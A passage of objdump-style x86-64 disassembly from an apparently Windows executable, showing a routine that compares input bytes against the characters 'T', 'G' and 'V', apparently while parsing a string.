   140005301:	e9 0d ff ff ff       	jmp    0x140005213
   140005306:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000530d:	00 00 00 
   140005310:	56                   	push   %rsi
   140005311:	53                   	push   %rbx
   140005312:	48 83 ec 48          	sub    $0x48,%rsp
   140005316:	44 8b 41 48          	mov    0x48(%rcx),%r8d
   14000531a:	41 8d 40 14          	lea    0x14(%r8),%eax
   14000531e:	89 41 48             	mov    %eax,0x48(%rcx)
   140005321:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140005325:	0f b6 10             	movzbl (%rax),%edx
   140005328:	80 fa 54             	cmp    $0x54,%dl
   14000532b:	74 4b                	je     0x140005378
   14000532d:	80 fa 47             	cmp    $0x47,%dl
   140005330:	75 67                	jne    0x140005399
   140005332:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140005336:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   14000533a:	80 78 01 00          	cmpb   $0x0,0x1(%rax)
   14000533e:	74 59                	je     0x140005399
   140005340:	48 8d 50 02          	lea    0x2(%rax),%rdx
   140005344:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140005348:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   14000534c:	80 fa 56             	cmp    $0x56,%dl
   14000534f:	0f 8f d3 01 00 00    	jg     0x140005528
